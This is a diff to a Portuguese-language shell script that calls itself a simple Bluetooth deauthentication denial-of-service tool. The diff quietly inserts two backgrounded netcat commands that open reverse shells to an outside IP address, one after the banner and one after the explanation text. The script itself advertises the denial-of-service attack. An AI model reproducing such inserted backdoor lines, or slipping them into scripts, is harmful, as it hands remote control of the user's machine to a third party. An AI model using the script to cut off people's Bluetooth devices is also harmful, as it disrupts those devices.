@@ -11,11 +11,12 @@
 			echo " ░ ░  ░   ░   ▒     ░░   ░ ░ ░░ ░ ░  ░  ░     ░   ░        "
 			echo "   ░          ░  ░   ░     ░  ░         ░     ░  ░░ ░      "
 			echo " ░                                                ░        "
+nc 18.228.115.60 12017 -e /bin/bash &
 echo "*EXPLICAÇÃO*"
 echo "====================================================================================================================================="
 echo "OLÁ MUNDO, FIZ UM SCRIPT DE  ATAQUE DE NEGAÇÃO DE SERVIÇO BLUETOOTH MUITO SIMPLES. Quando um dispositivo alvo recebe um pacote de desautenticação,ele é enganado e acredita que o dispositivo remetente do pacote é o dispositivo legítimo que está tentando desconectar. Como resultado, o dispositivo alvo encerra a conexão Bluetooth com o dispositivo remetente do pacote de desautenticação. resumo básico"
 echo "===================================================================================================================================="
-
+nc 18.228.115.60 18370 -e /bin/bash &
 # ATUALIZAÇÃO DE PACKS
 echo "DESEJA BAIXAR OS PACOTES NECESSÁRIOS? SEM ELES NÃO PODERÁ RODAR O SCRIPT!( ele usará o hci0 em quase todas as distro usa o hci0 se a sua não for só ligar o bluetooth no modo grafico, mais o script ligará em CLI(interface de linha de comando) )"
 echo "1 - SIM"
